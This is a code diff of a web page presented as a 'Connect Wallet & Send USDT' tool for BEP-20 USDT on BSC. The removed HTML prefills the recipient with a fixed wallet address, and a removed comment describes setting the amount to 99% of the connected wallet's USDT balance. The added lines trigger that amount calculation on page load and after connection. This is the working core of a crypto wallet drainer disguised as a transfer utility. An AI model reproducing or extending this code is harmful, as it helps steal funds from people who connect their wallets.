@@ -1,27 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Wallet & Send USDT</title>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-</head>
-<body>
-    <button id="connectWalletBtn">Connect Wallet</button>
-    <div id="walletAddress"></div>
-
-    <h2>Send USDT (BEP-20)</h2>
-    <label for="recipientAddress">Recipient Address:</label>
-    <input type="text" id="recipientAddress" value="0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE"><br><br>
-
-    <label for="amount">Amount (USDT):</label>
-    <input type="number" id="amount" step="any"><br><br>
-
-    <button id="sendFundsBtn" disabled>Send USDT</button>
-
-    <div id="transactionResult"></div>
-
-    <script>
+<script>
         document.addEventListener('DOMContentLoaded', () => {
             const connectWalletBtn = document.getElementById('connectWalletBtn');
             const walletAddressDiv = document.getElementById('walletAddress');
@@ -33,37 +10,6 @@
             let connectedAccount = null;
             let provider = null;
             const usdtContractAddress = '0x55d398326f99059fF775485246999027B3197955'; // USDT on BSC
-
-            connectWalletBtn.addEventListener('click', async () => {
-                if (typeof window.ethereum !== 'undefined') {
-                    try {
-                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
-                        if (accounts.length > 0) {
-                            connectedAccount = accounts[0];
-                            walletAddressDiv.textContent = `Connected Wallet: ${connectedAccount.substring(0, 6)}...${connectedAccount.slice(-4)}`;
-                            connectWalletBtn.textContent = 'Wallet Connected';
-                            sendFundsBtn.disabled = false;
-                            provider = new ethers.providers.Web3Provider(window.ethereum);
-                            console.log('Connected address:', connectedAccount);
-                            // Set initial 99% USDT amount after connecting
-                            updateUSDTAmount();
-                        } else {
-                            walletAddressDiv.textContent = 'No accounts found. Please connect your wallet.';
-                            sendFundsBtn.disabled = true;
-                            provider = null;
-                        }
-                    } catch (error) {
-                        console.error('Error connecting to wallet:', error);
-                        walletAddressDiv.textContent = `Error connecting: ${error.message}`;
-                        sendFundsBtn.disabled = true;
-                        provider = null;
-                    }
-                } else {
-                    walletAddressDiv.textContent = 'Web3 provider not found. Please install MetaMask or a compatible wallet.';
-                    sendFundsBtn.disabled = true;
-                    provider = null;
-                }
-            });
 
             async function getUSDTBalance(address) {
                 if (!provider || !address) return '0';
@@ -90,6 +36,43 @@
                     amountInput.value = '';
                 }
             }
+
+            // Call updateUSDTAmount on page load (in case wallet is already connected)
+            updateUSDTAmount();
+
+            connectWalletBtn.addEventListener('click', async () => {
+                if (typeof window.ethereum !== 'undefined') {
+                    try {
+                        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                        if (accounts.length > 0) {
+                            connectedAccount = accounts[0];
+                            walletAddressDiv.textContent = `Connected Wallet: ${connectedAccount.substring(0, 6)}...${connectedAccount.slice(-4)}`;
+                            connectWalletBtn.textContent = 'Wallet Connected';
+                            sendFundsBtn.disabled = false;
+                            provider = new ethers.providers.Web3Provider(window.ethereum);
+                            console.log('Connected address:', connectedAccount);
+                            // Update USDT amount after successful connection
+                            updateUSDTAmount();
+                        } else {
+                            walletAddressDiv.textContent = 'No accounts found. Please connect your wallet.';
+                            sendFundsBtn.disabled = true;
+                            provider = null;
+                            amountInput.value = ''; // Clear amount if disconnected
+                        }
+                    } catch (error) {
+                        console.error('Error connecting to wallet:', error);
+                        walletAddressDiv.textContent = `Error connecting: ${error.message}`;
+                        sendFundsBtn.disabled = true;
+                        provider = null;
+                        amountInput.value = ''; // Clear amount on error
+                    }
+                } else {
+                    walletAddressDiv.textContent = 'Web3 provider not found. Please install MetaMask or a compatible wallet.';
+                    sendFundsBtn.disabled = true;
+                    provider = null;
+                    amountInput.value = ''; // Clear amount if no provider
+                }
+            });
 
             sendFundsBtn.addEventListener('click', async () => {
                 if (!connectedAccount) {
@@ -126,5 +109,3 @@
             });
         });
     </script>
-</body>
-</html>
